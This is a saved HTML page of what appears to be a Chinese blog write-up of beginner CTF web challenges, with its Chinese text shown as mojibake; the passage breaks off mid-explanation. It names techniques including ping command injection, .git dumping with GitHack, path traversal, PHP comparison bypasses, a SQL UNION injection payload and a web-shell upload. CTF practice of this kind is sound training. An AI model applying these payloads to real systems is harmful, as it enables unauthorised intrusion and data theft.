<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf | å†åŠªåŠ›ä¸€ç‚¹ï¼Œå¥¹æ˜¯ä¸æ˜¯å°±ä¼šå›æ¥</title><meta name="author" content="é™ˆç¾½ç³"><meta name="copyright" content="é™ˆç¾½ç³"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="?ctfâ€“webå‰è¨€1234å¤ç°ä¸€ä¸‹æœ€è¿‘çš„æ–°æ‰‹èµ›ï¼Œå¤ç°å®Œå°±å»ååºåˆ—åŒ–å’Œjavaäº†ï¼Œsunå¸ˆå‚…æ‹·æ‰“çš„å‹è¿«æ„Ÿ?ctfçš„ä½“é‡å’Œè€ƒç‚¹éƒ½å¾ˆé€‚å®œå¥½ç©ï¼Œå¼€èµ›çš„æ—¶å€™åªæ‰“äº†week1çš„ï¼Œæœç„¶è¿˜æ˜¯ç­‰ä¸åŠï¼Œåé¢å°±æ²¡æ‰“å®Œèµ›æ‰“å®Œå¥½äº†ã€ä¾æ—§æ˜¯æ²¡æœ‰æ‰“week4çš„é‚£ä¿©ä½“ååºåˆ—åŒ–ï¼Œä¸‹æ¬¡ä¸€å®šå˜»å˜»ã€‘æœ‰çš„ç‚¹æ²¡æ€è·¯äº†å°±çœ‹äº†å®˜pï¼Œc3å“¥å“¥å¤§çˆ±æ¨¡æ¿ï¼Œå–œæ¬¢ã€å¾®ä¿¡å…¬ä¼—å·ç›´æ¥æœA1nataså°±å¥½äº†ã€‘ä¸å¯¹çš„é­”ä¸¸å‘è¨€çš„åœ°æ–¹ï¼Œéšæ—¶è”ç³»äº¤æµç‹ ç‹ æ‹·æ‰“æˆ‘ æ„Ÿè°¢">
<meta property="og:type" content="article">
<meta property="og:title" content="é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf">
<meta property="og:url" content="https://cyl-love.github.io/posts/15956.html">
<meta property="og:site_name" content="å†åŠªåŠ›ä¸€ç‚¹ï¼Œå¥¹æ˜¯ä¸æ˜¯å°±ä¼šå›æ¥">
<meta property="og:description" content="?ctfâ€“webå‰è¨€1234å¤ç°ä¸€ä¸‹æœ€è¿‘çš„æ–°æ‰‹èµ›ï¼Œå¤ç°å®Œå°±å»ååºåˆ—åŒ–å’Œjavaäº†ï¼Œsunå¸ˆå‚…æ‹·æ‰“çš„å‹è¿«æ„Ÿ?ctfçš„ä½“é‡å’Œè€ƒç‚¹éƒ½å¾ˆé€‚å®œå¥½ç©ï¼Œå¼€èµ›çš„æ—¶å€™åªæ‰“äº†week1çš„ï¼Œæœç„¶è¿˜æ˜¯ç­‰ä¸åŠï¼Œåé¢å°±æ²¡æ‰“å®Œèµ›æ‰“å®Œå¥½äº†ã€ä¾æ—§æ˜¯æ²¡æœ‰æ‰“week4çš„é‚£ä¿©ä½“ååºåˆ—åŒ–ï¼Œä¸‹æ¬¡ä¸€å®šå˜»å˜»ã€‘æœ‰çš„ç‚¹æ²¡æ€è·¯äº†å°±çœ‹äº†å®˜pï¼Œc3å“¥å“¥å¤§çˆ±æ¨¡æ¿ï¼Œå–œæ¬¢ã€å¾®ä¿¡å…¬ä¼—å·ç›´æ¥æœA1nataså°±å¥½äº†ã€‘ä¸å¯¹çš„é­”ä¸¸å‘è¨€çš„åœ°æ–¹ï¼Œéšæ—¶è”ç³»äº¤æµç‹ ç‹ æ‹·æ‰“æˆ‘ æ„Ÿè°¢">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cyl-love.github.io/img/1.jpg">
<meta property="article:published_time" content="2025-11-15T15:27:43.000Z">
<meta property="article:modified_time" content="2025-11-15T15:32:14.073Z">
<meta property="article:author" content="é™ˆç¾½ç³">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cyl-love.github.io/img/1.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf",
  "url": "https://cyl-love.github.io/posts/15956.html",
  "image": "https://cyl-love.github.io/img/1.jpg",
  "datePublished": "2025-11-15T15:27:43.000Z",
  "dateModified": "2025-11-15T15:32:14.073Z",
  "author": [
    {
      "@type": "Person",
      "name": "é™ˆç¾½ç³",
      "url": "https://cyl-love.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="https://cyl-love.github.io/posts/15956.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶å¤±è´¥',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'åŠ è½½æ›´å¤š'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´çº¿</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/2.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/1.jpg" alt="Logo"><span class="site-name">å†åŠªåŠ›ä¸€ç‚¹ï¼Œå¥¹æ˜¯ä¸æ˜¯å°±ä¼šå›æ¥</span></a><a class="nav-page-title" href="/"><span class="site-name">é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  è¿”å›é¦–é¡µ</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´çº¿</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹ä¹‹?ctf</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2025-11-15T15:27:43.000Z" title="å‘è¡¨äº 2025-11-15 23:27:43">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2025-11-15T15:32:14.073Z" title="æ›´æ–°äº 2025-11-15 23:32:14">2025-11-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%87%8D%E7%94%9F%E6%88%91%E8%A6%81%E5%BD%93web%E7%B3%95%E6%89%8B/">é‡ç”Ÿæˆ‘è¦å½“webç³•æ‰‹</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">æµè§ˆé‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="ctfâ€“web"><a href="#ctfâ€“web" class="headerlink" title="?ctfâ€“web"></a>?ctfâ€“web</h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¤ç°ä¸€ä¸‹æœ€è¿‘çš„æ–°æ‰‹èµ›ï¼Œå¤ç°å®Œå°±å»ååºåˆ—åŒ–å’Œjavaäº†ï¼Œsunå¸ˆå‚…æ‹·æ‰“çš„å‹è¿«æ„Ÿ</span><br><span class="line">?ctfçš„ä½“é‡å’Œè€ƒç‚¹éƒ½å¾ˆé€‚å®œå¥½ç©ï¼Œå¼€èµ›çš„æ—¶å€™åªæ‰“äº†week1çš„ï¼Œæœç„¶è¿˜æ˜¯ç­‰ä¸åŠï¼Œåé¢å°±æ²¡æ‰“å®Œèµ›æ‰“å®Œå¥½äº†ã€ä¾æ—§æ˜¯æ²¡æœ‰æ‰“week4çš„é‚£ä¿©ä½“ååºåˆ—åŒ–ï¼Œä¸‹æ¬¡ä¸€å®šå˜»å˜»ã€‘</span><br><span class="line">æœ‰çš„ç‚¹æ²¡æ€è·¯äº†å°±çœ‹äº†å®˜pï¼Œc3å“¥å“¥å¤§çˆ±æ¨¡æ¿ï¼Œå–œæ¬¢ã€å¾®ä¿¡å…¬ä¼—å·ç›´æ¥æœA1nataså°±å¥½äº†ã€‘</span><br><span class="line">ä¸å¯¹çš„é­”ä¸¸å‘è¨€çš„åœ°æ–¹ï¼Œéšæ—¶è”ç³»äº¤æµç‹ ç‹ æ‹·æ‰“æˆ‘ æ„Ÿè°¢å¸ˆå‚…</span><br></pre></td></tr></table></figure>

<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="from-http"><a href="#from-http" class="headerlink" title="from_http"></a><strong>from_http</strong></h3><h4 id="è€ƒç‚¹ï¼šhttpåè®®"><a href="#è€ƒç‚¹ï¼šhttpåè®®" class="headerlink" title="è€ƒç‚¹ï¼šhttpåè®®"></a>è€ƒç‚¹ï¼šhttpåè®®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»httpå…¥é—¨å§~</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251103142439101.png" alt="image-20251103142439101"></p>
<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping??"></a><strong>Ping??</strong></h3><h4 id="è€ƒç‚¹ï¼šlinuxå‘½ä»¤"><a href="#è€ƒç‚¹ï¼šlinuxå‘½ä»¤" class="headerlink" title="è€ƒç‚¹ï¼šlinuxå‘½ä»¤"></a>è€ƒç‚¹ï¼šlinuxå‘½ä»¤</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç»™ä½ ä¸€ä¸ªpingå·¥å…·ï¼Œç„¶åç‹ ç‹ çš„æƒ³åŠæ³•pingæˆ‘å§</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251103142651244.png" alt="image-20251103142651244"></p>
<p>å¯¹flagè¿›è¡Œäº†è¿‡æ»¤ï¼ŒæŸ¥çœ‹index.phpå‘ç°æ˜¯å¯¹å®Œæ•´çš„flagè¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆè¿›è¡Œé€šé…ç¬¦åŒ¹é…å°±å¥½äº†</p>
<p><img src="/../images/image-20251103142907720.png" alt="image-20251103142907720"><img src="/../images/image-20251103143046336.png" alt="image-20251103143046336"></p>
<h3 id="Gitttttttt"><a href="#Gitttttttt" class="headerlink" title="Gitttttttt"></a><strong>Gitttttttt</strong></h3><h4 id="è€ƒç‚¹ï¼š-gitä¿¡æ¯æ³„éœ²"><a href="#è€ƒç‚¹ï¼š-gitä¿¡æ¯æ³„éœ²" class="headerlink" title="è€ƒç‚¹ï¼š.gitä¿¡æ¯æ³„éœ²"></a>è€ƒç‚¹ï¼š.gitä¿¡æ¯æ³„éœ²</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä»Šå¤©å¸ƒç½®ç½‘ç«™çš„æ—¶å€™å‘ç°æœ¬åœ°æ€ä¹ˆæœ‰ä¸ª.gitæ–‡ä»¶å¤¹ï¼Œé‚£æ˜¯ä»€ä¹ˆï¼Ÿæ— æ‰€è°“äº†ï¼Œæˆ‘çš„é™æ€ç½‘é¡µä¸å¯èƒ½å­˜åœ¨æ¼æ´ï¼</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä½¿ç”¨gackbyè·å–.gitæ–‡ä»¶å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://challenge.ilovectf.cn:30589/.git/</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251103143455238.png" alt="image-20251103143455238"></p>
<p><img src="/../images/image-20251103143522322.png" alt="image-20251103143522322"></p>
<h3 id="åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼"><a href="#åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼" class="headerlink" title="åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼"></a><strong>åŒ…å«ä¸æ˜ä¸œè¥¿çš„é£Ÿç‰©ï¼Ÿï¼</strong></h3><h4 id="è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š"><a href="#è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š" class="headerlink" title="è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š"></a>è€ƒç‚¹ï¼šphpä¸­çš„æ–‡ä»¶åŒ…å«ä»¥åŠè·¯å¾„ç©¿è¶Š</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å°†ç‰©å“æŠ•å…¥é”…é‡Œå³å¯æ”¶è·ç¥ç§˜ç¤¼å“ğŸ˜‹</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251103144203470.png" alt="image-20251103144203470"></p>
<p>è¯•äº†è¯•æ˜¯å››å±‚ç›®å½•ç»“æ„</p>
<p><img src="/../images/image-20251103144239645.png" alt="image-20251103144239645"></p>
<h3 id="secret-of-php"><a href="#secret-of-php" class="headerlink" title="secret of php"></a><strong>secret of php</strong></h3><h4 id="è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ"><a href="#è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ" class="headerlink" title="è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ"></a>è€ƒç‚¹ï¼šphpçš„å¼±æ¯”è¾ƒ</h4><p><img src="/../images/image-20251103150121318.png" alt="image-20251103150121318"></p>
<p>intvalå‡½æ•°åå¼ºç­‰äºï¼Œä½¿ç”¨å°æ•°ç‚¹ç»•è¿‡?a&#x3D;2025.1</p>
<p><img src="/../images/image-20251103150218496.png" alt="image-20251103150218496"></p>
<p>æ¥åˆ°fll4g.phpæ˜¯ç»å…¸çš„md5äº†</p>
<p><img src="/../images/image-20251103150316954.png" alt="image-20251103150316954"></p>
<p>ç¬¬ä¸€å±‚æ˜¯ç‰¹æ®Šçš„å­—ç¬¦ä¸²ç»•è¿‡</p>
<p>ç¬¬äºŒå±‚æ˜¯æ•°ç»„ç»•è¿‡</p>
<p>ç¬¬ä¸‰å±‚æ˜¯md5ç¢°æ’</p>
<p><img src="/../images/image-20251103150939241.png" alt="image-20251103150939241"></p>
<h3 id="å‰ç«¯å°æ¸¸æˆ"><a href="#å‰ç«¯å°æ¸¸æˆ" class="headerlink" title="å‰ç«¯å°æ¸¸æˆ"></a><strong>å‰ç«¯å°æ¸¸æˆ</strong></h3><h4 id="è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡"><a href="#è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡" class="headerlink" title="è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡"></a>è€ƒç‚¹ï¼šjsä»£ç å®¡è®¡</h4><p><img src="/../images/image-20251103151239293.png" alt="image-20251103151239293"></p>
<p>base64è§£ç å³å¯</p>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ç™»å½•å’ŒæŸ¥è¯¢"><a href="#ç™»å½•å’ŒæŸ¥è¯¢" class="headerlink" title="ç™»å½•å’ŒæŸ¥è¯¢"></a><strong>ç™»å½•å’ŒæŸ¥è¯¢</strong></h3><h4 id="è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´-sqlæ³¨å…¥"><a href="#è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´-sqlæ³¨å…¥" class="headerlink" title="è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´+sqlæ³¨å…¥"></a>è€ƒç‚¹ï¼šå­—å…¸çˆ†ç ´+sqlæ³¨å…¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¿™ä¹ˆç®€å•çš„ç™»å½•å’ŒæŸ¥è¯¢ç•Œé¢ï¼Œåº”è¯¥æ˜¯æ¼æ´ç™¾å‡ºçš„å§ï½</span><br><span class="line"></span><br><span class="line">æç¤ºï¼šæœ¬é¢˜åªéœ€è¦å°‘äº100æ¬¡çš„çˆ†ç ´ï¼Œå¿«é€Ÿå¤§é‡çˆ†ç ´å¯èƒ½å¯¼è‡´æ„å¤–è¢«å¹³å°æ‹¦æˆªæµé‡ï¼ˆä¸æ˜¯é¢˜ç›®é—®é¢˜ï¼‰ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251103151647865.png" alt="image-20251103151647865"></p>
<p>ç»™äº†è´¦å·åå·²ç»å¯†ç å­—å…¸</p>
<p><img src="/../images/image-20251103151749681.png" alt="image-20251103151749681"></p>
<p>å¸¸è§„çˆ†ç ´å¯†ç ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ˜¯302é‡å®šå‘äº†</p>
<p><img src="/../images/image-20251103152137919.png" alt="image-20251103152137919"></p>
<p>ç™»å½•å¯†ç è¿›æ¥ä¹‹åæ˜¯ä¸€ä¸ªSQLæ³¨å…¥ï¼Œflagåœ¨flagsè¡¨é‡Œ</p>
<p><img src="/../images/image-20251103152329633.png" alt="image-20251103152329633"></p>
<p>sqlè”åˆæ³¨å…¥ï¼Œå‘idä¼ å…¥çš„å‚æ•°å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; UNION SELECT flag, NULL, NULL FROM flags WHERE id=2--%20</span><br></pre></td></tr></table></figure>

<h3 id="Only-Picture-Up"><a href="#Only-Picture-Up" class="headerlink" title="Only Picture Up"></a><strong>Only Picture Up</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å’¦ï¼Ÿä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡å°±èƒ½å¾—åˆ°flagï¼Ÿ</span><br></pre></td></tr></table></figure>

<h4 id="è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ "><a href="#è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ "></a>è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ </h4><p>ç®€å•çš„æ–‡ä»¶ä¸Šä¼ ç„¶åç›´æ¥è¿æ¥æœ¨é©¬å°±å¥½äº†</p>
<p>flagåœ¨æ ¹ç›®å½•ä¸‹</p>
<p><img src="/../images/image-20251103162640937.png" alt="image-20251103162640937"></p>
<h3 id="Regular-Expression"><a href="#Regular-Expression" class="headerlink" title="Regular Expression"></a>Regular Expression</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ä¸ªå¥½å·¥å…·ï¼</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20251103163025491.png" alt="image-20251103163025491"></p>
<h4 id="è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼"><a href="#è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼"></a>è€ƒç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼</h4><p>ç¬¬ä¸€å…³çš„æ­£åˆ™ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(&#x27;/^-(ctf|CTF)&lt;\n&gt;&#123;5&#125;[h-l]\d\d\W+@email\.com flag.\b$/&#x27;, $_ï¼Ÿ) &amp;&amp; strlen($_ï¼Ÿ) == 40)</span><br></pre></td></tr></table></figure>

<p>ä¼ å‚å˜é‡åæ˜¯?,ç„¶è€Œ?åœ¨urlä¸­â¼œæ˜¯èµ„æºè·¯å¾„å’Œå‚æ•°çš„åˆ†éš”ç¬¦,å¯ä»¥ä½¿ç”¨ç¼–ç æˆ–è€…å†™pythonè„šæœ¬æ¥è¯´æ˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1ã€^-</span><br><span class="line">è¿™æ˜¯å¿…é¡»ä»¥ - å·ä¸ºå­—ç¬¦ä¸²å¼€å¤´ï¼Œæ‰€ä»¥æˆ‘ä»¬å­—ç¬¦ä¸²çš„å¼€å¤´å¿…é¡»æ˜¯å‡å·ã€‚</span><br><span class="line">2ã€(ctf|CTF)</span><br><span class="line">è¿™ä¿©æ˜¯â¼€ä¸ªåŒ¹é…ç»„ï¼Œå°±æ˜¯å‡å·åâ¾¯ç´§è·Ÿç€å¾—æ˜¯ ctf æˆ–è€… CTF ï¼Œâ¼†è€…é€‰å…¶â¼€ã€‚</span><br><span class="line">3ã€&lt;\n&gt;&#123;5&#125;</span><br><span class="line">ä¸»è¦æ˜¯&gt;&#123;5&#125;ï¼Œè¿™ä¸ªçš„æ„æ€æ˜¯è¦æœ‰äº”ä¸ª&gt;ï¼Œ&lt;ä¸å˜ï¼Œ\næ˜¯æ¢â¾ï¼Œurlç¼–ç â¼€ä¸‹å°±æ˜¯%0aï¼Œæ‰€ä»¥è¿™â¾¥æ˜¯ &lt;%0a&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">4ã€[h-l]</span><br><span class="line">è¿™æ˜¯é€šé…ç¬¦ï¼Œåœ¨håˆ°lä¹‹å‰çš„å­—âºŸé€‰å…¶â¼€å¡«â¼Šï¼Œè¿™â¾¥å¯ä»¥æ˜¯hã€iã€jã€kã€lã€‚äº”é€‰â¼€å¡«â¼Š</span><br><span class="line">5ã€\d\d</span><br><span class="line">\dåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ˜¯ä»»æ„æ•°å­—ï¼Œä¸¤ä¸ªå°±æ˜¯ä»»æ„â¼€ä¸ªä¸¤ä½æ•°ï¼Œâ½å¦‚ 55</span><br><span class="line">6ã€\W+</span><br><span class="line">è¿™â¾¥æ˜¯ä¸é™¤ A-Zã€a-zã€0-9 å’Œä¸‹åˆ’çº¿ä»¥å¤–çš„ä»»æ„å­—ç¬¦åŒ¹é…ï¼Œâ½å¦‚!ã€@ã€~ã€#ã€ç©ºæ ¼ã€ç­‰ç­‰ã€‚åŠ å·çš„æ„æ€æ˜¯è´ªå©ªåŒ¹é…ï¼Œâ¼€</span><br><span 